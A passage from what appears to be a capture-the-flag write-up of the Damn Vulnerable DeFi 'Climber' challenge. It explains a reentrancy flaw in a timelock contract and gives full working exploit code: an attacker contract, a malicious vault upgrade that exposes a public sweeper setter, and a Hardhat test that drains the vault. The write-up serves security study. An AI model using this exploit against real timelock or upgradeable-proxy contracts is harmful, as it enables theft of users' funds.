_sweeper;\n    }\n\n    function _setSweeper(address newSweeper) private {\n        _sweeper = newSweeper;\n    }\n\n    function getLastWithdrawalTimestamp() external view returns (uint256) {\n        return _lastWithdrawalTimestamp;\n    }\n\n    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {\n        _lastWithdrawalTimestamp = timestamp;\n    }\n\n    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade\n    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/12.%20Climber/#goal","title":"Goal","text":"<p>To pass this challenge, we must take all DVT tokens from the vault (<code>ClimberVault</code> contract).</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/12.%20Climber/#exploit","title":"Exploit","text":"<p>In this CTF, again, we are dealing with upgradeable proxies. The <code>ClimberVault</code> is <code>UUPSUpgradeable</code> proxy, which means there is a proxy contract at the front, and whenever we are interacting with the vault, a call is made to the proxy contract which then delegates call to the <code>ClimberVault</code> (logic/implementation) contract.</p> <p>When <code>ClimberVault</code> contract is deployed, we can see that its <code>initialize</code> function is called, and inside this function, among other things, the ownership to this contract is transferred to a newly instantiated <code>ClimberTimelock</code> contract.</p> <p>In order to exploit the <code>ClimberVault</code>, we need to find a way to upgrade the proxy to point to a different version of the vault, and inside this new version we should set the malicious contract as the <code>_sweeper</code> and sweep all the funds from the vault.</p> <p>To do this we can make use of the <code>ClimberTimelock</code> contract.</p> <p>After inspecting the code inside <code>ClimberTimelock</code>, we can see that the purpose of this contract is to <code>schedule</code> and <code>execute</code> transactions on a time basis. Since this contract is the owner of <code>ClimberVault</code>, we can try to <code>schedule</code> and <code>execute</code> transactions that will trigger functions from the <code>ClimberVaul</code> contract.</p> <p>The reason <code>ClimberTimelock</code> is vulnerable to attack is beacuse the following check is done after an effect has already taken place</p> <pre><code>if (getOperationState(id) != OperationState.ReadyForExecution) {\n  revert NotReadyForExecution(id);\n}\n</code></pre> <p>if this check was before line 88, it would not have been possible to expolit this CTF. This way <code>ClimberTimelock</code> violates the <code>checks-effects-interactions</code> and enables a <code>reentrancy attack</code>.</p> <p>The sequence of steps we need to take in order to abuse <code>ClimberTimelock</code> is the following:</p> <ol> <li>create AttackerVault contract, this contract will be identical to ClimberVault, with only difference one difference, we will make _setSweeper function inside it to be public</li> <li> <p>prepare the necessary data in our <code>ClimberAttacker</code> contract that will be used as a function parameters to call <code>execute</code> function from <code>ClimberTimelock</code>. This data will consists the following:  <ul> <li>array of addresses called targets, first and second items will hold the address of ClimberTimelock, third and fourth items will hold the address of ClimberVault, fift item will hold the value of the ClimberAttacker contract</li> <li>array of uints called values, they should be 0 so no need to assign anything to them</li> <li>array of bytes called dataElements, first item will hold the value of the abi encoded function signature of grantRole function (this will be used to set the ClimberAttacker to have the PROPOSER_ROLE in order for ClimberAttacker contract to be able to schedule transactions inside ClimberTimelock); second item will hold the value of the abi encoded function signature of updateDelay (this will be used to update the delay inside ClimberTimelock to 0, so we don't have to wait 1 hour to execute a scheduled transaction); third item will hold the value of the abi encoded function signature of upgradeTo (this will update the vault (ClimberVault) proxy to point to the newly created malicious contract AttackerVault which will be the new update version of the vault); fourth item will hold the value of the abi encoded function signature of _setSweeper (inside the new version of the vault, we will set _setSweepet to be public so anyone can call it and we will set the sweeper of the vault to be the ClimberAttacker contract); fifth item will hold the value of the abi encoded function signature of makeSchedule function (we will add this function inside ClimberAttacker contract, it will be a callback function that ClimberTimelock contract will call after executing the last transaction sent to execute function)</li> </ul></p> </li> <li> <p>create attack function, inside this function we will call execute from ClimberTimelock with the previously prepared data, after the call has finished we will call sweepFunds() function from ClimberAttacker to sweep the funds from the vault</p> </li> <li>create makeSchedule function, inside this function we will call schedule from ClimberTimelock with the previously prepared data, this is a callback function that will be triggered after the last transction from execute is called</li> </ol>"},{"location":"3.%20Damn%20Vulnerable%20Defi/12.%20Climber/#attacker-contract-code","title":"Attacker contract code","text":"<p>ClimberAttacker.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { PROPOSER_ROLE } from \"./ClimberConstants.sol\";\n\ncontract ClimberAttacker {\n    address immutable timelock;\n    address immutable vault;\n    address immutable attackerVault;\n    address immutable token;\n\n    constructor(address payable _timelock, address _vault, address _attackerVault, address _token) {\n        timelock = _timelock;\n        vault = _vault;\n        attackerVault = _attackerVault;\n        token = _token;\n    }\n\n    // We call this function first (externally)\n    function attack() external {\n        bytes memory data = prepareData(\"execute(address[],uint256[],bytes[],bytes32)\");\n\n        (bool ok, ) = address(timelock).call(data);\n        require(ok, \"call failed\");\n\n        // This is called last\n        sweepFunds();\n    }\n\n    // This is called second internally\n    function makeSchedule() external {\n        bytes memory data = prepareData(\"schedule(address[],uint256[],bytes[],bytes32)\");\n\n        (bool ok, ) = address(timelock).call(data);\n        require(ok, \"call failed\");\n    }\n\n    function prepareData(string memory fnName) private view returns (bytes memory) {\n        address[] memory targets = new address[](5);\n        targets[0] = timelock;\n        targets[1] = targets[0];\n        targets[2] = vault;\n        targets[3] = targets[2];\n        targets[4] = address(this);\n\n        uint256[] memory values = new uint256[](5);\n\n        bytes[] memory dataElements = new bytes[](5);\n\n        dataElements[0] = abi.encodeWithSignature(\n            \"grantRole(bytes32,address)\",\n            PROPOSER_ROLE,\n            address(this)\n        );\n\n        dataElements[1] = abi.encodeWithSignature(\"updateDelay(uint64)\", 0);\n\n        dataElements[2] = abi.encodeWithSignature(\n            \"upgradeTo(address)\",\n            attackerVault\n        );\n\n        dataElements[3] = abi.encodeWithSignature(\n            \"_setSweeper(address)\",\n            address(this)\n        );\n\n        dataElements[4] = abi.encodeWithSignature(\"makeSchedule()\");\n\n        bytes memory data = abi.encodeWithSignature(\n            fnName,\n            targets,\n            values,\n            dataElements,\n            \"\"\n        );\n        return data;\n    }\n\n    function sweepFunds() private {\n        bytes memory data = abi.encodeWithSignature(\"sweepFunds(address)\", token);\n\n        (bool ok, ) = address(vault).call(data);\n        require(ok, \"call failed\");\n\n        IERC20(token).transfer(msg.sender, 10000000 ether);\n    }\n}\n</code></pre> <p>AttackerVault.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"solady/src/utils/SafeTransferLib.sol\";\n\nimport \"./ClimberTimelock.sol\";\nimport {WITHDRAWAL_LIMIT, WAITING_PERIOD} from \"./ClimberConstants.sol\";\nimport {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from \"./ClimberErrors.sol\";\n\n/**\n * @title ClimberVault\n * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract AttackerVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {\n    uint256 private _lastWithdrawalTimestamp;\n    address private _sweeper;\n\n    modifier onlySweeper() {\n        if (msg.sender != _sweeper) {\n            revert CallerNotSweeper();\n        }\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(address admin, address proposer, address sweeper) external initializer {\n        // Initialize inheritance chain\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n\n        // Deploy timelock and transfer ownership to it\n        transferOwnership(address(new ClimberTimelock(admin, proposer)));\n\n        _setSweeper(sweeper);\n        _updateLastWithdrawalTimestamp(block.timestamp);\n    }\n\n    // Allows the owner to send a limited amount of tokens to a recipient every now and then\n    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {\n        if (amount &gt; WITHDRAWAL_LIMIT) {\n            revert InvalidWithdrawalAmount();\n        }\n\n        if (block.timestamp &lt;= _lastWithdrawalTimestamp + WAITING_PERIOD) {\n            revert InvalidWithdrawalTime();\n        }\n\n        _updateLastWithdrawalTimestamp(block.timestamp);\n\n        SafeTransferLib.safeTransfer(token, recipient, amount);\n    }\n\n    // Allows trusted sweeper account to retrieve any tokens\n    function sweepFunds(address token) external onlySweeper {\n        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));\n    }\n\n    function getSweeper() external view returns (address) {\n        return _sweeper;\n    }\n\n    function _setSweeper(address newSweeper) public {\n        _sweeper = newSweeper;\n    }\n\n    function getLastWithdrawalTimestamp() external view returns (uint256) {\n        return _lastWithdrawalTimestamp;\n    }\n\n    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {\n        _lastWithdrawalTimestamp = timestamp;\n    }\n\n    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade\n    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/12.%20Climber/#solution-code","title":"Solution code","text":"<pre><code>const { ethers, upgrades } = require('hardhat');\nconst { expect } = require('chai');\nconst { setBalance } = require('@nomicfoundation/hardhat-network-helpers');\n\ndescribe('[Challenge] Climber', function () {\nlet deployer, proposer, sweeper, player;\nlet timelock, vault, token;\n\nconst VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;\nconst PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;\nconst TIMELOCK_DELAY = 60 * 60;\n\nbefore(async function () {\n/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */\n[deployer, proposer, sweeper, player] = await ethers.getSigners();\n\nawait setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);\nexpect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);\n\n// Deploy the vault behind a proxy using the UUPS pattern,\n// passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function\nvault = await upgrades.deployProxy(\nawait ethers.getContractFactory('ClimberVault', deployer),\n[ deployer.address, proposer.address, sweeper.address ],\n{ kind: 'uups' }\n);\n\nexpect(await vault.getSweeper()).to.eq(sweeper.address);\nexpect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);\nexpect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);\nexpect(await vault.owner()).to.not.eq(deployer.address);\n\n// Instantiate timelock\nlet timelockAddress = await vault.owner();\ntimelock = await (\nawait ethers.getContractFactory('ClimberTimelock', deployer)\n).attach(timelockAddress);\n\n// Ensure timelock delay is correct and cannot be changed\nexpect(await timelock.delay()).to.eq(TIMELOCK_DELAY);\nawait expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');\n\n// Ensure timelock roles are correctly initialized\nexpect(\nawait timelock.hasRole(ethers.utils.id(\"PROPOSER_ROLE\"), proposer.address)\n).to.be.true;\nexpect(\nawait timelock.hasRole(ethers.utils.id(\"ADMIN_ROLE\"), deployer.address)\n).to.be.true;\nexpect(\nawait timelock.hasRole(ethers.utils.id(\"ADMIN_ROLE\"), timelock.address)\n).to.be.true;\n\n// Deploy token and transfer initial token balance to the vault\ntoken = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();\nawait token.transfer(vault.address, VAULT_TOKEN_BALANCE);\n});\n\nit('Execution', async function () {\n/** CODE YOUR SOLUTION HERE */\nattackerVault = await (await ethers.getContractFactory('AttackerVault', player)).deploy();\n\nclimberAttacker = await (await ethers.getContractFactory('ClimberAttacker', player)).deploy(\ntimelock.address,\nvault.address,\nattackerVault.address,\ntoken.address\n);\n\nawait climberAttacker.connect(player).attack();\n});\n\nafter(async function () {\n/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */\nexpect(await token.balanceOf(vault.address)).to.eq(0);\nexpect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);\n});\n});\n</code></pre>"}]}